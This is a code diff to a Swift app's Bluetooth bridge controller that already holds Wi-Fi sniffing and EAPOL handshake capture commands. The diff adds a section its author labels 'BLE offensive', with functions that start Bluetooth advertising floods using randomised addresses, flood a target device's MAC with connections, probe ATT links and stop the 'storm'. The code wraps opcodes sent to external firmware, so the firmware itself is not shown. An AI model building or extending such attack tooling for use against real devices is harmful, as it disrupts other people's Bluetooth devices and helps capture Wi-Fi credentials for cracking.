@@ -53,6 +53,10 @@ final class BridgeManager: NSObject, ObservableObject, CBCentralManagerDelegate,
         case sniffStop = 0x31
         case sniffDump = 0x32
         case sniffStats = 0x33
+        case bleFlood = 0x40
+        case bleConnFlood = 0x41
+        case bleAttProbe = 0x42
+        case bleStormStop = 0x43
     }
 
     struct BTDevice: Identifiable {
@@ -486,6 +490,45 @@ final class BridgeManager: NSObject, ObservableObject, CBCentralManagerDelegate,
         DispatchQueue.main.async { self.captures = out }
         log("sniff dump: \(out.count) sessione(i) EAPOL")
         return out
+    }
+
+    // MARK: Fase B — BLE offensive (host-level)
+
+    func bleFlood(_ on: Bool, randAddr: Bool = true) async -> Bool {
+        guard connected else { return false }
+        let r = await sendAwait(.bleFlood, payload: [on ? 1 : 0, randAddr ? 1 : 0], timeout: 6)
+        let ok = r?.0 == 0
+        log(ok ? "BLE adv flood \(on ? "ON" : "OFF")" : "BLE adv flood rifiutato")
+        return ok
+    }
+
+    func bleConnFlood(mac: String, addrType: UInt8, count: Int) async -> (accepted: Int, conns: Int, rc: UInt16)? {
+        guard connected, var m = mac.replacingOccurrences(of: ":", with: "").hexBytes, m.count == 6 else { return nil }
+        m.append(addrType)
+        m.append(UInt8(clamping: count))
+        guard let r = await sendAwait(.bleConnFlood, payload: m, timeout: 14) else { return nil }
+        let p = [UInt8](r.1)
+        guard p.count >= 4 else { return nil }
+        let rc = UInt16(p[2]) | (UInt16(p[3]) << 8)
+        log("BLE conn flood: accepted=\(p[0]) attive=\(p[1]) rc=\(rc)")
+        return (Int(p[0]), Int(p[1]), rc)
+    }
+
+    func bleAttProbe(count: Int = 8) async -> Int? {
+        guard connected, let r = await sendAwait(.bleAttProbe, payload: [UInt8(clamping: count)], timeout: 8) else { return nil }
+        let p = [UInt8](r.1)
+        guard r.0 == 0, p.count >= 2 else {
+            log("ATT probe: nessun link GATTC")
+            return nil
+        }
+        log("ATT probe: \(p[0]) richieste su \(p[1]) link")
+        return Int(p[0])
+    }
+
+    func bleStormStop() async -> Bool {
+        guard connected, let r = await sendAwait(.bleStormStop, timeout: 6) else { return false }
+        log("BLE storm stop \(r.0 == 0 ? "ok" : "fail")")
+        return r.0 == 0
     }
 
     private func parseHandshake(_ p: [UInt8]) -> Handshake? {
